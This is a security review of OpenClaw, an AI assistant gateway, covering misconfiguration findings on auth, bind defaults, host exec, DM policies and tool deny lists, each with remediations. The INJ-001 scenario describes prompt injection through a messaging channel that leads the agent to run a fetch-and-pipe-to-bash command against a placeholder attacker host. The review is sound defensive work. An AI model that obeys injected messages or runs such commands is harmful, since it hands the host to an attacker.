Executive Summary

OpenClaw is a local-first personal AI assistant: a Node.js/TypeScript monorepo with a Gateway control plane, multi-channel messaging integrations (WhatsApp, Telegram, Slack, Discord, etc.), agent tool execution (shell, filesystem, browser, MCP), optional Docker sandboxing, and a Lit-based Control UI. The project explicitly models one trusted operator per gateway — not multi-tenant adversarial isolation.

The codebase demonstrates mature security engineering: built-in openclaw doctor / security audit tooling, SSRF pinning with metadata IP blocking, constant-time secret comparison, hook token hardening, weak-credential rejection, skill/plugin static scanning, and non-root Docker runtime. Risk concentrates in deployment misconfiguration (LAN/public bind without auth, open DM policies, exec running on host with security=full) and in the intentional trusted-operator feature surface (full gateway token = full RCE via tools).

Recommendation: Approve with fixes — safe for intended local-first use; do not expose to untrusted networks without mandatory hardening.

Do not deploy Gateway on LAN/internet with gateway.auth.mode=none, open DM policies, or host exec without sandboxing and channel allowlists. Run openclaw security audit after every config change. Critical findings below are exploitable when operators ignore documented trust boundaries — not latent logic bugs in the default onboarding path.

App-specific review guidelines

  1. Every non-loopback Gateway bind must have gateway.auth token/password configured (src/security/audit-gateway-config.ts).
  2. Shared gateway bearer auth is full operator access — treat token compromise as RCE (SECURITY.md, src/gateway/tools-invoke-http.ts:45-47).
  3. Channel ingress must use dmPolicy=pairing or allowlist — never open on internet-facing bots without explicit acceptance.
  4. Host exec defaults to security=full, ask=off when sandbox is off (src/agents/exec-defaults.ts:117-132) — enable sandbox or tighten exec policy for channel-facing agents.
  5. All outbound fetches must pass src/infra/net/ssrf.ts pinning unless operator opts into dangerouslyAllowPrivateNetwork.
  6. Plugins/skills are trusted computing base — scan before install (src/security/skill-scanner.js).
  7. Docker Compose must not publish LAN bind without pre-set OPENCLAW_GATEWAY_TOKEN.

Critical & High Findings

[IAC-001] Docker Compose defaults to LAN bind (0.0.0.0)

Critical
Category
Infrastructure / Misconfiguration
Location
docker-compose.yml:63-76
CWE
CWE-16, CWE-306

Description. The shipped Docker Compose file publishes ports 18789/18790 and starts the Gateway with --bind lan (all interfaces). OPENCLAW_GATEWAY_TOKEN is optional in the environment file. While startup auto-generates a runtime token when unset (src/gateway/startup-auth.ts:191-221), it is not persisted (persistedGeneratedToken: false), making token rotation/opaque retrieval difficult and encouraging operators to run without a pre-provisioned secret.

Evidence.

ports:
  - "${OPENCLAW_GATEWAY_PORT:-18789}:18789"
command:
  ["node", "dist/index.js", "gateway", "--bind", "${OPENCLAW_GATEWAY_BIND:-lan}", ...]
environment:
  OPENCLAW_GATEWAY_TOKEN: ${OPENCLAW_GATEWAY_TOKEN:-}

Exploit scenario.

  1. Operator runs docker compose up on a cloud VM or home network without setting OPENCLAW_GATEWAY_TOKEN.
  2. Gateway listens on 0.0.0.0:18789 reachable from the LAN or public security group.
  3. Attacker on the same network scans for the port; if token is leaked from logs/UI or auth is mis-set to none, attacker obtains full operator access including POST /tools/invoke → host exec.

Remediation. Change default bind to loopback with network_mode: host documented for advanced cases; require non-empty OPENCLAW_GATEWAY_TOKEN at compose startup (fail closed); persist generated tokens to mounted config volume.

Verification. docker compose config shows loopback bind; container refuses start when token env is empty on non-loopback bind; openclaw security audit reports no gateway.bind_no_auth finding.

[AUTH-001] Gateway auth.mode=none on non-loopback bind

Critical
Category
Authentication
Location
src/security/audit-gateway-config.ts:118-125; src/security/audit-extra.sync.ts:754-764
CWE
CWE-306, CWE-862

Description. When gateway.auth.mode is none and bind is not loopback (or Tailscale serve/funnel is active), HTTP endpoints including /tools/invoke, optional /v1/chat/completions, and /v1/responses are reachable without a shared secret. The built-in audit flags this as critical.

Evidence.

if (bind !== "loopback" && !hasSharedSecret && auth.mode !== "trusted-proxy") {
  findings.push({
    checkId: "gateway.bind_no_auth",
    severity: "critical",
    title: "Gateway binds beyond loopback without auth",
    ...
  });
}

Exploit scenario.

  1. Operator sets gateway.auth.mode: "none" and gateway.bind: "lan" for convenience.
  2. Attacker sends unauthenticated POST /tools/invoke with {"tool":"exec","args":{...}}.
  3. Attacker executes arbitrary commands on the gateway host as the Node process user.

Remediation. Refuse startup when mode=none and bind ≠ loopback (fail closed); keep audit check enabled; document that HTTP compatibility endpoints require token/password auth.

Verification. Gateway process exits on invalid combo; audit shows zero critical auth findings after fix.

[INJ-001] Exec tool defaults to security=full, ask=off on gateway host

High
Category
OS Command Injection / RCE
Location
src/agents/exec-defaults.ts:117-132
CWE
CWE-78

Description. When sandbox is unavailable (agents.defaults.sandbox.mode=off, the default per SECURITY.md), exec resolves to the gateway host with security: "full" and ask: "off" unless explicitly overridden. This is intentional for the trusted single-operator model but creates RCE when an untrusted channel sender can trigger agent turns.

Evidence.

const defaultSecurity = resolved.effectiveHost === "sandbox" ? "deny" : "full";
return {
  security: ... ?? defaultSecurity,  // "full" on gateway
  ask: ... ?? "off",
};

Exploit scenario.

  1. Operator connects Telegram with permissive DM policy or approves a malicious paired sender.
  2. Attacker sends a message crafted to make the model invoke the exec tool (prompt injection).
  3. Agent runs curl attacker.com/s.sh | bash on the host without approval prompt.

Remediation. For channel-facing agents: set agents.defaults.sandbox.mode to non-main or all; configure tools.exec.security: "allowlist" and tools.exec.ask: "on-miss"; restrict channel DM/group policies to allowlisted senders only.

Verification. openclaw security audit shows no tools.exec.security_full_configured warning for production agents; test exec from sandboxed session is denied on gateway host.

[AUTH-002] Loopback bind without gateway auth secret

High
Category
Authentication
Location
src/security/audit-gateway-config.ts:153-162
CWE
CWE-306

Description. Loopback-only bind without a configured gateway auth secret is flagged critical when Control UI is enabled, because reverse proxies can expose loopback services to the internet without the operator realizing auth is absent.

if (bind === "loopback" && controlUiEnabled && !hasGatewayAuth) {
  checkId: "gateway.loopback_no_auth",
  severity: "critical",
  ...
}

Exploit scenario. Operator puts nginx/Caddy in front of 127.0.0.1:18789 without configuring gateway.auth.token. External users reach Control UI WebSocket and HTTP APIs without credentials.

Remediation. Always set OPENCLAW_GATEWAY_TOKEN before exposing via reverse proxy; configure gateway.trustedProxies and gateway.controlUi.allowedOrigins.

Verification. Audit passes; unauthenticated external request to proxied UI returns 401.

[API-001] gateway.tools.allow re-enables dangerous HTTP tools

High
Category
API security
Location
src/security/dangerous-tools.ts:9-34; src/security/audit-gateway-config.ts:104-116
CWE
CWE-749

Description. By default, high-risk tools (exec, spawn, shell, fs_write, sessions_spawn, cron, gateway, nodes, etc.) are denied over HTTP POST /tools/invoke. Adding them to gateway.tools.allow removes them from the deny list — severity escalates to critical when gateway is remotely exposed.

export const DEFAULT_GATEWAY_HTTP_TOOL_DENY = [
  "exec", "spawn", "shell", "fs_write", "fs_delete", ...
];

Exploit scenario. Operator adds exec to gateway.tools.allow for automation. Stolen bearer token → direct HTTP RCE without WebSocket session.

Remediation. Keep default deny list; use WebSocket operator session for interactive tools; if HTTP exec is required, bind loopback-only and rotate tokens frequently.

Verification. HTTP POST /tools/invoke with tool exec returns forbidden unless explicitly allowed.

[AUTHZ-001] dmPolicy=open allows any sender to drive the agent

High
Category
Authorization / Business logic
Location
src/security/audit-channel.ts:17-28, 219-225; src/security/dm-policy-shared.ts:192
CWE
CWE-862

Description. Channel DM policy open with allowFrom: ["*"] allows any messaging user to interact with the agent. Combined with host exec defaults, this is equivalent to public RCE for internet-facing bots. Default wizard policy is pairing (src/channels/plugins/setup-wizard-helpers.ts:657) — safe unless operator overrides.

Exploit scenario. Operator sets WhatsApp/Telegram DM policy to open for a public support bot. Any user messages the bot → agent executes attacker-controlled tool calls on the host.

Remediation. Keep dmPolicy: "pairing" or strict allowlists; enable sandbox for any channel with >1 untrusted sender; run channel warnings from security audit before go-live.

Verification. Unknown sender receives pairing code, not agent execution; audit reports no open DM policies.

[AUTH-003] Non-loopback Control UI without explicit allowedOrigins

High
Category
Authentication / CSRF
Location
src/security/audit-gateway-config.ts:164-180; src/gateway/origin-check.ts:35-78
CWE
CWE-352, CWE-942

Description. Control UI WebSocket connections validate browser Origin against gateway.controlUi.allowedOrigins. On non-loopback binds, empty allowlist is a critical misconfiguration. Origin check includes private-network same-origin fallback but not public DNS rebinding without explicit allowlist.

Exploit scenario. Gateway on LAN without allowedOrigins; attacker hosts malicious page that attempts cross-origin WebSocket connection — mitigated only if origin check rejects; mis-set dangerouslyAllowHostHeaderOriginFallback weakens defense.

Remediation. Set explicit HTTPS origins; never use "*" on exposed deployments; disable host-header fallback.

Verification. WebSocket from untrusted origin rejected with policy error; audit clean.

[API-002] Shared gateway bearer = full operator access on HTTP tool endpoints

High
Category
API / Authorization design
Location
src/gateway/tools-invoke-http.ts:45-47; SECURITY.md:126-133
CWE
CWE-269

Description. Documented design: token/password bearer on /tools/invoke and OpenAI-compatible endpoints grants full operator scopes; x-openclaw-scopes headers do not restrict shared-secret callers. This is not a bypass — it is the trust model — but operators treating the token as a narrow API key will over-expose RCE.

// /tools/invoke intentionally uses the same shared-secret HTTP trust model ...
// token/password bearer auth is full operator access for the gateway

Exploit scenario. Operator embeds gateway token in a client-side app or logs it in CI. Token leak → full filesystem/exec/gateway reconfiguration.

Remediation. Treat gateway token like root password; use short-lived tokens; never embed in browsers; prefer loopback + local CLI for admin actions.

Verification. Scoped header does not reduce tool access under token auth (documented behavior confirmed in tests).

[DESER-001] Config loaded via JSON/JSON5 without integrity signing

Medium

Location: src/config/paths.ts:107-145 ($include resolution)

Config supports $include with optional OPENCLAW_INCLUDE_ROOTS allowlist. No yaml.load/pickle in runtime. Tampered config files on disk affect gateway behavior — mitigated by filesystem permissions (~/.openclaw mode 700 in Docker).

Fix: Restrict include roots; protect config directory permissions; use secrets refs instead of inline tokens.

[SEC-001] API keys and channel tokens in local state

Medium

Location: .env.example:14-77, src/secrets/

Model provider keys, channel bot tokens, and gateway secrets resolve from env, config, or encrypted auth-profile store. Exposure of ~/.openclaw or mounted Docker volumes leaks all credentials.

Fix: Use OS keychain/secret refs; chmod 700 state dirs; separate auth-profile secret mount (OPENCLAW_AUTH_PROFILE_SECRET_DIR).

[DEPS-001] Large third-party dependency surface

Medium

Location: package.json, pnpm-lock.yaml, 140+ extensions

Monorepo includes Matrix crypto natives, Playwright, sharp, many channel SDKs. Dockerfile pins base image digests; Dependabot configured. No exhaustive CVE scan performed in this review.

Fix: Run pnpm audit / OSV in CI; keep lockfile frozen; minimize optional extensions in production images.

Recommended Next Steps

Deployment blockers (mandatory for internet/LAN exposure)

  1. Set strong OPENCLAW_GATEWAY_TOKEN before any non-loopback bind (IAC-001, AUTH-001)
  2. Change Docker Compose default bind to loopback or require token at startup (IAC-001)
  3. Never use gateway.auth.mode=none on LAN/public interfaces (AUTH-001)
  4. Keep channel dmPolicy: pairing or allowlist — audit before go-live (AUTHZ-001)
  5. Enable sandbox + exec allowlist/ask for any channel-facing agent (INJ-001)

Recommended (non-blocking)

  1. Run openclaw security audit --fix after onboarding and on config changes
  2. Configure gateway.controlUi.allowedOrigins for non-loopback UI (AUTH-003)
  3. Do not add exec/shell to gateway.tools.allow unless strictly necessary (API-001)
  4. Add pnpm audit / OSV to CI pipeline (DEPS-001)
  5. Review enabled extensions and disable unused channel plugins to reduce attack surface
  6. Re-run this review after major gateway/auth/tool changes
